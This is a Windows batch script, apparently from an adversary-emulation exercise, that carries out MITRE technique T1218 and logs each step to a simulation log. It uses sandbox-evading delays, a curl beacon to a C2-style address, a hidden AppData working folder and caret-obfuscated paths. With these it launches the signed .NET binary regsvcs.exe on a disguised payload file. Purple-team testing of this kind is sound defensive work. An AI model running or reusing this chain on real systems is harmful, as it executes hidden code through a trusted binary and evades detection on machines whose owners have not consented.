@echo off
SETLOCAL ENABLEDELAYEDEXPANSION
SET txisnba=%APPDATA%\8756\41aceeb3
SET mdvfmsbx=https://10.0.0.49
SET keghkgto=https://10.0.0.49/stage/2/icon.png?8756-7
SET jwcnifl=ITZEL-S2BO
SET rrocubc=7
SET xzanpex=firelox.txt
SET dvhhyc=8756
SET lfzkr=%APPDATA%\!rrocubc!\macula-simulations.log

timeout /t 45 /nobreak >nul
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: script_started=delay_completed>> "!lfzkr!" 2>nul

curl -k -s -o nul "!keghkgto!"
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: heartbeat_sent=!keghkgto!>> "!lfzkr!" 2>nul

ping -n 8 127.0.0.1 >nul
SET /A rndlay=%RANDOM% %% 20 + 10
timeout /t !rndlay! /nobreak >nul
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: random_delay=!rndlay!s>> "!lfzkr!" 2>nul

cd /d "!txisnba!"
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: chdir_target=!txisnba!>> "!lfzkr!" 2>nul

SET fn=%S^y^s^t^e^m^R^o^o^t%
SET p1=!fn!\\M^i^c^r^o^s^o^f^t^.^N^E^T\\
SET p2=F^r^a^m^e^w^o^r^k^\\v^4^.^0^.^3^0^3^1^9^\\
SET p3=r^e^g^s^v^c^s^.^e^x^e

CHOICE /C Y /N /D Y /T 12 >nul
SET r_=1
SET e_=
!p1!!p2!!p3! "!xzanpex!" >nul 2>nul
IF ERRORLEVEL 1 (
 SET r_=0
 SET e_=assembly_load_failed
)
echo [!DATE! !TIME!][!jwcnifl!]: !rrocubc!-!dvhhyc!-T1218|Signed_Binary_Proxy_Execution=!r_!::!e_!>> "!lfzkr!" 2>nul
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: regsvcs_executed=!r_!>> "!lfzkr!" 2>nul

timeout /t 15 /nobreak >nul